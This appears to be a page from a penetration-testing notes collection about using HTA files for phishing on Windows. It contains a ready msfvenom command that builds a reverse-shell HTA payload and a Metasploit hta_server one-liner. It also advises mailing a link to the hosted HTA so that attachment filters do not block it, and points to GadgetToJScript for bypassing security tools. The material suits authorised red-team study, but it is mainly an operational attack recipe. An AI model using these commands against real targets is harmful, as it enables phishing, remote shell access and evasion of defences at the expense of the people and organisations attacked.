| 🏠 [Home](../../pentesting.md) | ⬅️ ⬅️ [Part](../_part) | ⬅️ [Chapter](./_chapter) |
|--------------------------------|----------------------|-------------------------|

-   [HTA](#hta){#toc-hta}
    -   [Introduction](#introduction){#toc-introduction}
    -   [Tools](#tools){#toc-tools}
        -   [Metasploit](#metasploit){#toc-metasploit}
        -   [GadgetToJScript](#gadgettojscript){#toc-gadgettojscript}

# HTA

## Introduction

An HTA is a Windows program that combines HTML and scripting languages
(such as VBScript and JScript). It generates the user interface and
executes as a \"fully trusted\" application, without the constraints of
a browser's security model.

An HTA is executed using `mshta.exe`, which is typically installed along
with Internet Explorer, making `mshta` dependant on IE. So if it has
been uninstalled, HTAs will be unable to execute.

NOTE: During phishing we will host our hta file and use link in a
phishing mail http://x.x.x.x/demo.hta . If you send hta file directly as
an attachment, by default, Office has filetype filtering in place that
will prevent you from attaching certain files to emails (including HTAs,
which is why we'd opt to sending a link instead).

## Tools

### Metasploit

    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f hta-psh -o shell.hta

host the payload.

Metasploit `HTA Web Server`:

    msfconsole -x "use exploit/windows/misc/hta_server; set LHOST <l_ip>; set LPORT <revshell_port>; set SRVHOST <l_ip>; set SRVPORT <srv_port> run -j"

then send the link to paylaad provided by msfvenom

### GadgetToJScript

[GadgetToJScript](https://github.com/med0x2e/GadgetToJScript) offer more
functionality to bypass security tools by generating .NET serialized
gadgets that can trigger .NET assembly load/execution when deserialized
using BinaryFormatter from JS/VBS/VBA scripts.
